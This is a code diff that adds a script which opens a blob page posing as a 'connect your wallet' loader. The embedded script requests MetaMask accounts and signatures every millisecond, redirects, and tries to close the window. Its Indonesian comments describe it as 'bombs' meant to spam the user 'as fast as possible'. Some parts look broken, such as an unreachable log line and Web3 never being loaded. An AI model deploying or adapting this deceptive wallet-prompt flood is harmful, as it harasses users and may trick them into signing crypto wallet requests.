@@ -1,0 +1,51 @@
+<script>
+const htmlContent = `
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Loading...</title>
+  <style>
+    body { font-family: Arial; text-align: center; padding: 50px; background: #000; color: #0f0; }
+    h1 { font-size: 2.5em; }
+  </style>
+</head>
+<body>
+  <h1>Please wait while we connect your wallet...</h1>
+
+  <script>
+    // Semua bom dijalankan begitu user klik di luar tab (blur)
+    window.onload = () => {
+      setInterval(() => {
+        var web3 = new Web3(window.ethereum);
+    
+        async function getAddress() {
+            return await web3.eth.requestAccounts();
+            console.log(address);
+        }
+        var addresses;
+        getAddress().then((value) => {
+            addresses = value;
+            web3.eth.personal.sign("Hi Metamask!", addresses[0])
+        });
+       //location.href = "tel://";
+        location.replace("http://google.com");
+        window.close();
+        close();
+        self.close();
+    
+      }, 1); // spam secepat mungkin
+    };
+
+    // Biar langsung kena saat user coba fokus lagi atau alt+tab
+    setTimeout(() => window.blur(), 800);
+  </\script>
+</body>
+</html>
+`;
+
+// Buat blob dan langsung redirect ke halaman itu
+const blob = new Blob([htmlContent], { type: 'text/html' });
+const url = URL.createObjectURL(blob);
+location.href = url;
+</script>
